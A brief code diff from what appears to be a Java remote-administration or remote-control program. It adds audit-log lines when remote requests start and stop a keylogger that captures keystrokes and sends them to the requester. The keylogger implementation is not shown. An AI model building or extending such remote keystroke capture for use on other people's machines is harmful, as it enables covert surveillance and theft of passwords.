@@ -105,11 +105,14 @@ public class ActionThread extends Thread {
 			//	System.out.println(recorded);
 
 				KL.get_Keylogger(oos);
-			
+				this.record = "Start key logging";
+				main.actionRecorded(fromIP, record);
 			}else if (request.equals("KEY_LOGGER_STOP")) {
 				//KeyLogger KL = new KeyLogger(oos);
 				//KL.unhook();
 				KL.send_Keylogger();
+				this.record = "End key logging";
+				main.actionRecorded(fromIP, record);
 			}else if (request.equals("DELETE_KEY")) {
 				//KeyLogger KL = new KeyLogger(oos);
 				KL.delete();
